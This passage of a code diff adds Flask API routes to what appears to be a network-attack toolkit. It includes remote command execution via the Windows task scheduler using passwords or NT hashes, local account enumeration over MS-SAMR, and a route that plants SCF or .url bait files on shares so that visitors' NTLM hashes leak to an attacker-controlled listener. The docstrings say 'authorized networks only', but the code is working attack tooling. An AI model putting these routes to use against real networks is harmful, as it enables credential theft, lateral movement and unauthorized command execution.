+        return jsonify({"error": "password or nthash required"}), 400
+    result = at_exec.exec_cmd(
+        target, command, user,
+        password=data.get("password") or None,
+        nthash=data.get("nthash") or None,
+        domain=(data.get("domain") or "").strip(),
+        port=int(data.get("port") or 445),
+        timeout=int(data.get("timeout") or 8),
+        task=(data.get("task") or "").strip() or None,
+    )
+    return jsonify({**result, "status": at_exec.status()}), (200 if result.get("ok") else 502)
+
+
+@app.route("/api/samr/dump", methods=["POST"])
+def api_samr_dump():
+    """Local account reconnaissance via MS-SAMR: domains + local users.
+
+    Body: {target, user, password | nthash, domain?, port?, timeout?}.
+    Active feature — authorized networks only.
+    """
+    if analysis is None:
+        return jsonify({"error": "no analysis context"}), 400
+    data = request.get_json(silent=True) or {}
+    target = (data.get("target") or "").strip()
+    user = (data.get("user") or "").strip()
+    if not target:
+        return jsonify({"error": "target required"}), 400
+    if not user:
+        return jsonify({"error": "user required"}), 400
+    if not (data.get("password") or data.get("nthash")):
+        return jsonify({"error": "password or nthash required"}), 400
+    result = samr_dump.dump(
+        target, user,
+        password=data.get("password") or None,
+        nthash=data.get("nthash") or None,
+        domain=(data.get("domain") or "").strip(),
+        port=int(data.get("port") or 445),
+        timeout=int(data.get("timeout") or 8),
+    )
+    return jsonify({**result, "status": samr_dump.status()}), (200 if result.get("ok") else 502)
+
+
+@app.route("/api/bait/drop", methods=["POST"])
+def api_bait_drop():
+    """Drop an SCF/.url hash-capture bait file on a writable share.
+
+    Body: {target, listener, user, password | nthash, domain?, port?, timeout?,
+    fname?, kind: scf|url, share?}. Active feature — authorized networks only.
+    """
+    if analysis is None:
+        return jsonify({"error": "no analysis context"}), 400
+    data = request.get_json(silent=True) or {}
+    target = (data.get("target") or "").strip()
+    listener = (data.get("listener") or "").strip()
+    user = (data.get("user") or "").strip()
+    if not target:
+        return jsonify({"error": "target required"}), 400
+    if not listener:
+        return jsonify({"error": "listener required (UNC path hosts the icon — your responder/relay)"}), 400
+    if not user:
+        return jsonify({"error": "user required"}), 400
+    if not (data.get("password") or data.get("nthash")):
+        return jsonify({"error": "password or nthash required"}), 400
+    kind = data.get("kind") or "scf"
+    if kind not in ("scf", "url"):
+        return jsonify({"error": "kind must be scf or url"}), 400
+    result = bait_drop.drop(
+        target, listener, user,
+        password=data.get("password") or None,
+        nthash=data.get("nthash") or None,
+        domain=(data.get("domain") or "").strip(),
+        port=int(data.get("port") or 445),
+        timeout=int(data.get("timeout") or 8),
+        fname=(data.get("fname") or "settings").strip(),
+        kind=kind,
+        share=(data.get("share") or "").strip() or None,
+    )
+    return jsonify({**result, "status": bait_drop.status()}), (200 if result.get("ok") else 502)
+
+
+@app.route("/api/exec/status")
+def api_exec_status():
+    """Post-auth attack counters/events (scmr/atexec/samr/bait)."""
+    return jsonify({"scmr": scmr_exec.status(), "atexec": at_exec.status(),
+                    "samr": samr_dump.status(), "bait": bait_drop.status()})
 
 
 @app.route("/api/relay/start", methods=["POST"])
